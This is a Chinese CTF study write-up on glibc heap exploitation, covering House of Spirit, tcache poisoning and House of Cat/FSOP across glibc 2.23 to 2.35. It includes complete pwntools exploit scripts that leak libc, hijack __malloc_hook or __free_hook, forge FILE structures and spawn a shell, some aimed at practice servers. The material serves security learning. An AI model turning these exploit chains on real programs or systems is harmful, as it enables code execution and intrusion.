## 原理：

House of Spirit的主要思想是覆盖一个堆指针，使其指向可控的区域，构造好相关数据，释放堆指针时系统会将该区域作为chunk放到fastbin里，再申请这块区域，这块区域就可能改写目标区域。在堆里面一般依赖uaf漏洞攻击，uaf一般都是出现在del函数里面的，也就是free掉某处堆地址但是没有将指向那个堆地址指针置空，也就是说还可以通过那个指针访问到那个堆空间的地址。这最初是Fastbin Attack的其中一种攻击手段。这种攻击手段是变量覆盖和堆管理机制的组合利用，其核心操作是在目标位置处伪造 fastbin chunk，利用变量覆盖的手段覆盖堆指针，使其指向fastbin fake chunk，而后将其释放，再申请刚释放的fake chunk，就有可能改写原先不可控的区域。具体是：就是泄露完libc后，在栈上找一个空间用来伪造一个chunk，将这个chunk的fd指针改成malloc hook或free_hook的地址，然后再将这个malloc hook或free_hook的fd改成后门，这样在你再次申请的时候就会触发后门，大概就是这个意思。

## 各版本的glibc的不同点：

- 在2.26之前是不存在Tcache bin的，只有fast，large，small,unsorted bin这四个，在这个时候利用double free 漏洞一般是free（a），free（b），free（a），之所以在中间加上一个free(b)是因为fastbin有检查，不能连续释放同一个chunk。并且tcache 和fastbin的chunk的指针最后一位必须是0。

- 在2.26以及往后是存在Tcache bin的，每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk，64位机器16字节递增，从0x20到0x410，也就是说位于以上大小的chunk释放后都会先行存入到tcache bin中。在2.27的版本中修复了double free。然后就依次按照chunk的大小放在对应的bins中，在2.31之前是可以连续free（a）的，这个时候是没有检查的，利用double free会比fastbin中的好用。

- 2.31 新增了 Tcache Bin Count 检测，程序会检测 mp_.tcache_count ，如果数量不对则会报错退出

- 在2.32出现了tcache bin的fd的指针加密

- 在2.34及以后的版本是存在一个Tcache 存取的检查，也就是key，这个就是说在你free一个chunk的之后，key就会等于你释放的chunk，在你下次释放的chunk的时候就会对比key中的chunk是否和你这次需要释放的chunk是一样的，防止你double free，并且就是把hook函数取消了，也就是用不了malloc_hook函数和free_hook函数了

## 2.23版本：
![[Pasted image 20240923214210.png]]
下面create函数

![[Pasted image 20240923214232.png]]

下面是delete函数，uaf，没有将指针置空
![[Pasted image 20240923214241.png]]

第一步我们需要去利用unsorted bin去泄露libc。
![[Pasted image 20240923214250.png]]
那么我们就需要去释放一个chunk的大小是属于unsorted bin的，那么我们要知道在64位下0x20到0x80是属于fastbin的，后面就是small bin和unsorted bin和large bin的，各bins的大小可以自己查，我们只需要大于0x80一点就行。

这里我申请的0x90的size大小，加上chunk头就是0xa0了，然后可以发现是unsorted bin，可以看到fd和bk指向的都是同一地址，这就是main_arena的真实地址。
![[Pasted image 20240923214308.png]]
然后main_arena的地址减去0x68就是malloc_hook的地址，我们就直接得出其地址了。

然后就通过malloc__hook算出base_libc。对于有个add(2,0x60)的原因是防止free(1)的时候合并到top_chunk

,所以是用来隔断的。

![[Pasted image 20240923214347.png]]

在该版本下，**伪造fast_bins区间的chunk时，会检测该chunk的size域是否位于fast_bins的区间内**，所以我们要找个fake_fast_chunk，pwndbg里安置了该插件，供我们快速寻找。因为我们**劫持的是malloc_hook**，所以我们寻找它的fake_fast_chunk即可,一般来说，`fake_fast_chunk = malloc_hook - 0x23`

![[Pasted image 20240923214358.png]]

然后就是通过uaf修改上个chunk的fd指针为这个fake_fast_chunk的地址。

然后将这个chunk给申请出来，然后再申请一个chunk,这个chunk就是fake_fast_chunk，然后就修改fake_fast_chunk的fd指针为one_gadget(后门)，然后再申请一个chunk，这个chunk就是后门函数。

然后就会直接出发system了。

现在我调试一下把fd改成fake_fast_chunk地址的过程，我们可以看到下面的第一张图中的free chunk fastbins的fd是0x0

![[Pasted image 20240923214411.png]]

我把fake的地址打印出来如下图所示

![[Pasted image 20240923214420.png]]

下面是将fd改成fake_fast_chunk的效果

![[Pasted image 20240923214429.png]]

下面是将fake fast chunk的fd改成one_gadget的地址:

第一张图malloc hook的fd地址是空的

![[Pasted image 20240923214437.png]]

下图是one_gadget地址

![[Pasted image 20240923214444.png]]

我们将one_gadget的地址写入了fd.

在这里我要说明一下，在写后门的时候，我们要注意空间地址的对齐，如果不对其就会导致写进malloc_hook的后门地址不对，这里我写进去填充是十三个字节。

![[Pasted image 20240923214456.png]]
![[Pasted image 20240923214506.png]]
__malloc_hook全局变量：

函数介绍：_lib_malloc首先通过__malloc_hook全局变量获取一个函数指针，然后判断这个函数是否为空，这个函数代表用户自定义的堆分配函数，主要为了方便用户快速修改该函数并进行测试

_malloc_hook漏洞：如果__malloc_hook被修改，那么就会执行被修改后的函数（one_gadget）

从下面的源码可以看到，先读取__malloc_hook全局变量，然后判断是否有用户自定义的堆分配函数，如果有就执行，不再进行系统的堆分配了(_int_malloc)

![[Pasted image 20240923214522.png]]

```
from pwn import *
p = process('./heap')
libc = ELF('./libc.so.6')
def add(idx,size):
    p.recvuntil('>>')
    p.sendline(b'1')
    p.recvuntil(b'idx? ')
    p.sendline(str(idx))
    p.recvuntil('size? ')
    p.sendline(str(size))

def delete(idx):
    p.recvuntil('>>')
    p.sendline(b'2')
    p.recvuntil(b'idx? ')
    p.sendline(str(idx))

def show(idx):
    p.recvuntil('>>')
    p.sendline(b'3')
    p.recvuntil(b'idx? ')
    p.sendline(str(idx))

def edit(idx,content):
    p.recvuntil('>>')
    p.sendline(b'4')
    p.recvuntil(b'idx? ')
    p.sendline(str(idx))
    p.recvuntil('content : ')
    p.send(content)

add(0,0x200)
attach(p)

add(1,0x60)

add(2,0x60)

delete(0)

show(0)

p.recvuntil('content : ')
malloc_hook = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 0x68
libc_base = malloc_hook - libc.sym['__malloc_hook']

onegadget = libc_base + 0xf1247
log.success('one=>'+hex(onegadget))
fake_chunk = malloc_hook - 0x23
log.success('fake==>'+hex(fake_chunk))

delete(1)


edit(1,p64(fake_chunk))

add(3,0x60)

add(4,0x60)

edit(4,b"a"*0x13+p64(onegadget))

add(5,0)

p.interactive()

```

## 2.27版本

tcache引入了两个新的结构体

```
typedef struct tcache_entry{
    struct tcache_entry *next;
} tcache_entry;

typedef struct tcache_perthread_struct
{
    char counts[TCACHE_MAX_BINS];
    tchche_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

tcache的链表操作由`tcache_put`和`tcache_get`完成。

```
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
    assert (tc_idx < TCACHE_MAX_BINS);
    e->next = tcache->entries[tc_idx];
    tcache->entries[tc_idx] = e;
    ++(tcache->counts[tc_idx]);
}

/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static void *
tcache_get (size_t tc_idx)
{
    tcache_entry *e = tcache->entries[tc_idx];
    assert (tc_idx < TCACHE_MAX_BINS);
    assert (tcache->entries[tc_idx] > 0);
    tcache->entries[tc_idx] = e->next;
    --(tcache->counts[tc_idx]);
    return (void *) e;
}
```

函数内部没有进行任何完整性检查，而是将其交给了外围操作完成

- tcache更宽松的检查让畸形数据更易构造
- tcache结构本身非常脆弱，是”优良”的攻击目

由于tcache_put函数在把chunk放入tcache Bin时没有做过多检查，我们可以在释放一个chunk将其放入tcache后，直接修改其fd指针为**任意地址处**，比fastbin attack更易利用的是我们无需构造fake_fastbin_size以绕过检查，便可直接将任意地址处插入到tcache Bin中。因此，常与其他漏洞利用方式，例如：off by one等结合，用来在最后劫持程序流到one_gadget程序段或system等函数处。

（此处注意在glibc 2.26下，unsortedbin的fd已经不再指向<main_arena+88>处，而是<main_arena+96>）

![[Pasted image 20240923214532.png]]

这里需要注意的是next指向chunk的`data`部分，这和fastbin有一些不同，fastbin的fd指向的是下一个chunk的头指针。tcache_entry会复用空闲chunk的data部分

tcache执行流程如下：

第一次malloc时，回显malloc一块内存用来存放tcache_perthread_struct，这块内存size一般为0x251

释放chunk时，如果chunk的size小于small bin size，在进入tcache之前会先放进fastbin或者unsorted bin中

在放入tcache后：

先放到对应的tcache中，直到tcache被填满（7个）

tcache被填满后，接下来再释放chunk，就会直接放进fastbin或者unsorted bin中

tcache中的chunk不会发生合并，不取消inuse bit

重新申请chunk，并且申请的size符合tcache的范围，则先从tcache中取chunk，直到tcache为空

tcache为空后，从bin中找

tcache为空时，如果fastbin、small bin、unsorted bin中有size符合的chunk，会先把fastbin、small bin、unsorted bin中的chunk放到tcache中，直到填满，之后再从tcache中取

需要注意的是，在采用tcache的情况下，只要是bin中存在符合size大小的chunk，那么在重启之前都需要经过tcache一手。并且由于tcache为空时先从其他bin中导入到tcache，所以此时chunk在bin中和在tcache中的顺序会反过来

tcache由于省略了很多安全保护机制，所以在pwn中的利用方式有很多，我首先介绍tcache poisoning这种利用方式

tcache poisoning主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址

### 下面就堆题讲解：

![[Pasted image 20240923214543.png]]

![[Pasted image 20240923214553.png]]
![[Pasted image 20240923214600.png]]

![[Pasted image 20240923214606.png]]
![[Pasted image 20240923214617.png]]

- **函数介绍：**与__malloc_hook一样，如果用户自动了释放函数，则调用该函数，并且直接执行返回了
- **__free_hook漏洞：**如果将__free_hook变为一个后门的地址，那么就可以执行这个后门

从下面的源码可以看到，先读取__free_hook全局，然后判断是否有用户自定义的函数，如果有就执行，不再进行系统的堆释放了(_int_free)

![[Pasted image 20240923214630.png]]

```
from pwn import *

# p = process('./heap')
p=remote("node4.anna.nssctf.cn",28913)
elf = ELF('./heap')
libc = ELF('./libc.so.6')

context(os='linux',arch='amd64')

def add(idx,size):
    p.recvuntil('>>')
    p.sendline(b'1')
    p.recvuntil(b'idx? ')
    p.sendline(str(idx))
    p.recvuntil('size? ')
    p.sendline(str(size))

def delete(idx):
    p.recvuntil('>>')
    p.sendline(b'2')
    p.recvuntil(b'idx? ')
    p.sendline(str(idx))

def show(idx):
    p.recvuntil('>>')
    p.sendline(b'3')
    p.recvuntil(b'idx? ')
    p.sendline(str(idx))

def edit(idx,content):
    p.recvuntil('>>')
    p.sendline(b'4')
    p.recvuntil(b'idx? ')
    p.sendline(str(idx))
    p.recvuntil('content : ')
    p.send(content)

add(0,0x410)
add(1,0x10)
add(2,0x10)
delete(0)
show(0)

libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-96-0x10-libc.symbols['__malloc_hook']

system = libc_base+libc.symbols['system']
print('libc_base-->'+hex(libc_base))
free_hook  = libc_base+libc.symbols['__free_hook']
delete(1)
delete(2)
edit(2,p64(free_hook))
add(3,0x50)
add(4,0x50)
edit(4,p64(system))
add(5,0x30)
edit(5,b'/bin/sh\x00')
delete(5)
p.interactive()

```

## 2.31版本

新增了 Tcache Bin Count 检测，程序会检测 mp_.tcache_count ，如果数量不对则会报错退出

让我们观察一下`_int_free`中的tcache操作：

```
size_t tc_idx = csize2tidx (size);

if (tcache &&
    tc_idx < mp_.tcache_bins &&
    tcache->counts[tc_idx] < mp_.tcache_count)
{
    tcache_put (p, tc_idx);
    return;
}
```

`mp_.tcache_bins`是常量值，与`TCACHE_MAX_BINS`相等；`mp_.tcache_count`的值为7。

在这段代码之前，唯一执行的检查只有`check_inuse_chunk`。代码本身只会验证idx是否符合要求，cache是否达到上限。相比与旧的free机制，释放一块伪造的chunk会更加容易。

- chunk的指针地址满足`2 * SIZE_SZ`对齐
- chunk size的大小低于tcache的上限(0x410)

面对如此宽松的检查，我们无需构造合法的`next_size`即可完成house of spirit。

```
from pwn import *

# p = process('./heap')
p=remote("node4.anna.nssctf.cn",28200)
elf = ELF('./heap')
libc = ELF('./libc.so.6')

context(os='linux',arch='amd64')

def add(idx,size):
    p.recvuntil('>>')
    p.sendline(b'1')
    p.recvuntil(b'idx? ')
    p.sendline(str(idx))
    p.recvuntil('size? ')
    p.sendline(str(size))

def delete(idx):
    p.recvuntil('>>')
    p.sendline(b'2')
    p.recvuntil(b'idx? ')
    p.sendline(str(idx))

def show(idx):
    p.recvuntil('>>')
    p.sendline(b'3')
    p.recvuntil(b'idx? ')
    p.sendline(str(idx))

def edit(idx,content):
    p.recvuntil('>>')
    p.sendline(b'4')
    p.recvuntil(b'idx? ')
    p.sendline(str(idx))
    p.recvuntil('content : ')
    p.send(content)

add(0,0x410)
add(1,0x10)
add(2,0x10)
delete(0)
show(0)

libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-96-0x10-libc.symbols['__malloc_hook']

system = libc_base+libc.symbols['system']
print('libc_base-->'+hex(libc_base))
free_hook  = libc_base+libc.symbols['__free_hook']
delete(1)
delete(2)
edit(2,p64(free_hook))
add(3,0x10)
add(4,0x10)
edit(4,p64(system))
add(5,0x30)
edit(5,b'/bin/sh\x00')
delete(5)
p.interactive()
```

## 2.35版本

由于这个版本的hook函数都被取消了，使用不了malloc_hook和 free_hook,可以打 House of Cat，劫持 _IO_list_all 结构体的 chain 刷新伪造的IO结构体来GetShell

FILE 结构体的利用是一种通用的控制流劫持技术。攻击者可以覆盖堆上的 FILE 指针使其指向一个伪造的结构，利用结构中一个叫做 `vtable` 的指针，来执行任意代码。

我们知道 FILE 结构被一系列流操作函数（`fopen()`、`fread()`、`fclose()`等）所使用，大多数的 FILE 结构体保存在堆上（stdin、stdout、stderr除外，位于libc数据段），其指针动态创建并由 `fopen()` 返回。在 glibc（2.23） 中，这个结构体是 `_IO_FILE_plout`，包含了一个 `_IO_FILE` 结构体和一个指向 `_IO_jump_t` 结构体的指针：

```

struct _IO_FILE {
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
// libio/libioP.h

struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};

/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};

extern struct _IO_FILE_plus *_IO_list_all;
```

FSOP

FSOP（File Stream Oriented Programming）是一种劫持 _IO_list_all（libc.so中的全局变量） 来伪造链表的利用技术，通过调用 _IO_flush_all_lockp() 函数来触发，该函数会在下面三种情况下被调用：

- libc 检测到内存错误时
- 执行 exit 函数时
- main 函数返回时

当 glibc 检测到内存错误时，会依次调用这样的函数路径：malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> _IO_OVERFLOW。

这个 vtable 中包含了一个叫做 `_IO_str_overflow` 的函数，该函数中存在相对地址的引用（可伪造）：

```
int
_IO_str_overflow (_IO_FILE *fp, int c)
{
    int flush_only = c == EOF;
    _IO_size_t pos;
    if (fp->_flags & _IO_NO_WRITES)
        return flush_only ? 0 : EOF;
    if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
        fp->_flags |= _IO_CURRENTLY_PUTTING;
        fp->_IO_write_ptr = fp->_IO_read_ptr;
        fp->_IO_read_ptr = fp->_IO_read_end;
    }
    pos = fp->_IO_write_ptr - fp->_IO_write_base;
    if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))                       // 条件 #define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
    {
        if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
            return EOF;
        else
        {
            char *new_buf;
            char *old_buf = fp->_IO_buf_base;
            size_t old_blen = _IO_blen (fp);
            _IO_size_t new_size = 2 * old_blen + 100;                                 // 通过计算 new_size 为 "/bin/sh\x00" 的地址
            if (new_size < old_blen)
                return EOF;
            new_buf
                = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);     // 在这个相对地址放上 system 的地址，即 system("/bin/sh")
            [...]
```

```
// libio/strfile.h

struct _IO_str_fields
{
    _IO_alloc_type _allocate_buffer;
    _IO_free_type _free_buffer;
};

struct _IO_streambuf
{
    struct _IO_FILE _f;
    const struct _IO_jump_t *vtable;
};

typedef struct _IO_strfile_
{
    struct _IO_streambuf _sbf;
    struct _IO_str_fields _s;
} _IO_strfile;
```

所以可以像下面这样构造：

- fp->_flags = 0
- fp->_IO_buf_base = 0
- fp->_IO_buf_end = (bin_sh_addr - 100) / 2
- fp->_IO_write_ptr = 0xffffffff
- fp->_IO_write_base = 0
- fp->_mode = 0

```
from PwnModules import *

io, elf = get_utils('./heap_2.35', True, 'node3.anna.nssctf.cn', 28755)
init_env(1, 'debug')
libc = ELF('/home/kaguya/PwnExp/Libc/NSS/2.35-3.7/libc.so.6')


def add(idx, size):
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'idx? ', str(idx))
    io.sendlineafter(b'size? ', str(size))


def free(idx):
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b'idx? ', str(idx))


def show(idx):
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'idx? ', str(idx))


def edit(idx, content):
    io.sendlineafter(b'>>', b'4')
    io.sendlineafter(b'idx? ', str(idx))
    io.sendlineafter(b'content : ', content)


add(0, 0x480)
add(9, 0x10)
free(0)
show(0)

libc_base = leak_addr(2, io) - 0x21ace0
system = libc_base + libc.sym['system']

show_addr('libc_base', libc_base)

fake_io_addr = libc_base + libc.sym['_IO_2_1_stderr_']
io_list_all = libc_base + libc.sym['_IO_list_all']
show_addr('fake_io_addr', fake_io_addr)

add(6, 0x480)

free(9)
show(9)

io.recvuntil(b'content : ')
heap_base = u64(io.recv(5).ljust(8, b'\x00')) << 12
heap_key = heap_base >> 12
print(hex(heap_key))

add(10, 0x10)

add(2, 0x120)
add(3, 0x120)
free(2)
edit(2, p64(0))
free(2)

Fake_IO_File_Structure = IO_FILE_plus_struct()
Fake_IO_File_Structure.flags = b'/bin/sh\x00'
Fake_IO_File_Structure._IO_save_base = p64(1)                                           # RCX
Fake_IO_File_Structure._IO_backup_base = p64(heap_base + 0x9b0 + 0x120 - 0xa0)          # mov    rdx, qword ptr [rax + 0x20]
Fake_IO_File_Structure._IO_save_end = p64(system)                                       # call   qword ptr [rax + 0x18]
Fake_IO_File_Structure._wide_data = p64(heap_base + 0x9b0 + 0x30)                       # mov    rax, qword ptr [rdi + 0xa0]
Fake_IO_File_Structure._offset = 0
Fake_IO_File_Structure._vtable_offset = 0
Fake_IO_File_Structure._mode = 1
Fake_IO_File_Structure.vtable = p64(libc_base + libc.sym['_IO_wfile_jumps'] + 0x30)

Fake_IO_File_Structure = bytes(Fake_IO_File_Structure)
Fake_IO_File_Structure += p64(0) * 6
Fake_IO_File_Structure += p64(heap_base + 0x9b0 + 0x40)

FakeIOFS = IO_FILE_plus_struct()
FakeIOFS.flags = p64(heap_base + 0x9b0)
FakeIOFS.chain = p64(heap_base + 0x9b0)
FakeIOFS._mode = 0
FakeIOFS = bytes(FakeIOFS)

edit(2, p64(heap_key ^ io_list_all))
add(4, 0x120)
add(5, 0x120)
edit(5, FakeIOFS)
add(8, 0x120)
edit(8, Fake_IO_File_Structure)

print(f"[*] Len: {hex(len(Fake_IO_File_Structure))}")

debug(io)

io.sendlineafter(b'>>', b'5')

io.interactive()
```

用一种方法是利用全局变量environ,去泄露栈地址，unlink去泄露libc地址

```
from pwn import *

filename = './heap'

debug = 1
if debug :
    io = remote('node4.anna.nssctf.cn', 28020)
else:
    io = process(filename)

elf = ELF(filename)

context(arch = elf.arch, log_level = 'debug', os = 'linux')

def dbg():
	gdb.attach(io)
	
def add(index, size):
	io.sendlineafter('>>', '1')
	io.sendlineafter('idx? ', str(index))
	io.sendlineafter('size? ', str(size))
	
def delete(index):
	io.sendlineafter('>>', '2')
	io.sendlineafter('idx? ', str(index))
	
def show(index):
	io.sendlineafter('>>', '3')
	io.sendlineafter('idx? ', str(index))
	
def edit(index, content):
	io.sendlineafter('>>', '4')
	io.sendlineafter('idx? ', str(index))
	io.sendlineafter('content : ', content)
	
libc = ELF('./libc.so.6')
	
add(0, 0x410)
add(1, 0x60)
add(2, 0x60)
delete(0)
show(0)
io.recvuntil('content : ')
environ = u64(io.recv(6).ljust(8, b'\0')) + 0x7520
success('environ =>> ' + hex(environ))
libcbase = environ - libc.sym['environ']
sys = libcbase + libc.sym['system']
bin_sh = libcbase + libc.search(b'/bin/sh\x00').__next__()
rdi = libcbase + 0x2a3e5
ret = libcbase + 0x29139

delete(1)
delete(2)
show(1)
io.recvuntil('content :')
heap = u64(io.recv(6).ljust(8, b'\0')) * 0x10 + 0x530
success('heap =>> ' + hex(heap))

edit(2, p64((heap >> 12) ^ (environ)))

add(3, 0x60)

add(4, 0x60)
show(4)
io.recvuntil('content : ')
stack = u64(io.recv(6).ljust(8, b'\0')) - 0x120
success('stack =>> ' + hex(stack))

add(5, 0x60)
delete(5)
delete(3)

edit(3, p64((heap >> 12) ^ (stack - 0x8)))
add(6, 0x60)
add(7, 0x60)
edit(7, b'A' * 0x18)
show(7)
io.recvuntil('content : ')
io.recv(0x18)
bss = u64(io.recv(6).ljust(8, b'\0')) + 0x2986
success('bss =>> ' + hex(bss))

add(8, 0x60)
delete(8)
delete(3)
edit(3, p64((heap >> 12) ^ (bss)))

add(9, 0x60)
add(10, 0x60)

edit(10, p64(0) + p64(stack - 0x20))

edit(7, p64(rdi) + p64(bin_sh) + p64(ret) + p64(sys))

io.interactive()
```